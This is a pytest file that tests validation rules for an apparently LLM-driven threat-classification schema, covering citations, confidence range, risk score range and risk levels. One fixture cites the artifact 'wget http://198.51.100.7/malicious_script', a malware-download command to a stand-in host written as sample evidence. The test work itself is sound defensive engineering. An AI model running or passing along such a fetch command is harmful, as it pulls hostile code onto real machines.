import pytest
from pydantic import ValidationError

from app.services.llm.schemas import ClassificationResult, EvidenceCitation


def test_classification_requires_at_least_one_citation() -> None:
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="Botnet dropper",
            confidence=0.9,
            risk_score=87,
            risk="critical",
            behavior_summary="Downloaded and ran a script.",
            evidence=[],
        )


def test_confidence_outside_zero_to_one_is_rejected() -> None:
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="Botnet dropper",
            confidence=90,
            risk_score=87,
            risk="critical",
            behavior_summary="x",
            evidence=[EvidenceCitation(event_id="e1", artifact="wget x")],
        )


def test_risk_score_outside_zero_to_hundred_is_rejected() -> None:
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="Botnet dropper",
            confidence=0.9,
            risk_score=870,
            risk="critical",
            behavior_summary="x",
            evidence=[EvidenceCitation(event_id="e1", artifact="wget x")],
        )


def test_unknown_risk_level_is_rejected() -> None:
    with pytest.raises(ValidationError):
        ClassificationResult(
            classification="Botnet dropper",
            confidence=0.9,
            risk_score=87,
            risk="apocalyptic",
            behavior_summary="x",
            evidence=[EvidenceCitation(event_id="e1", artifact="wget x")],
        )


def test_valid_classification_is_accepted() -> None:
    result = ClassificationResult(
        classification="Automated botnet dropper",
        confidence=0.91,
        risk_score=87,
        risk="critical",
        behavior_summary="Downloaded and executed a remote script.",
        evidence=[
            EvidenceCitation(
                event_id="seed-botnet-01-008",
                artifact="wget http://198.51.100.7/malicious_script",
            )
        ],
    )
    assert result.evidence[0].event_id == "seed-botnet-01-008"
